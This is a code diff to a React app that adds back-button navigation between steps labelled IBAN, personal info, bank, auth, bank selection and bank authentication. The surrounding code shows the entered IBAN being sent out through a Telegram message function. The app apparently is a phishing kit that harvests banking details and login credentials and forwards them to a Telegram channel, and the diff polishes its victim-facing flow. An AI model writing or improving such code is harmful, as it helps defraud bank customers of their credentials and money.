@@ -36,6 +36,31 @@ export default function App() {
     setCurrentStep('home');
   };
 
+  const handleBackToPrevious = () => {
+    switch(currentStep) {
+      case 'iban':
+        setCurrentStep('home');
+        break;
+      case 'personal':
+        setCurrentStep('iban');
+        break;
+      case 'bank':
+        setCurrentStep('personal');
+        break;
+      case 'auth':
+        setCurrentStep('bank');
+        break;
+      case 'bankSelection':
+        setCurrentStep('auth');
+        break;
+      case 'bankAuth':
+        setCurrentStep('bankSelection');
+        break;
+      default:
+        setCurrentStep('home');
+    }
+  };
+
   const handleIbanSubmit = async (iban: string) => {
     const success = await sendTelegramMessage(iban);
     if (success) {
@@ -113,7 +138,7 @@ export default function App() {
         </div>
       )}
       {currentStep === 'personal' && (
-        <PersonalInfoForm onSubmit={handlePersonalInfoSubmit} />
+        <PersonalInfoForm onSubmit={handlePersonalInfoSubmit} onBack={handleBackToPrevious} />
       )}
       {currentStep === 'bank' && (
         <BankForm onSubmit={handleBankFormSubmit} amount={userAmount} />
@@ -125,6 +150,7 @@ export default function App() {
         <BankSelectionForm 
           onBankSelect={handleBankSelection}
           onExternalBankSelect={handleExternalBankSelection}
+          onBack={handleBackToPrevious}
         />
       )}
       {currentStep === 'bankAuth' && (
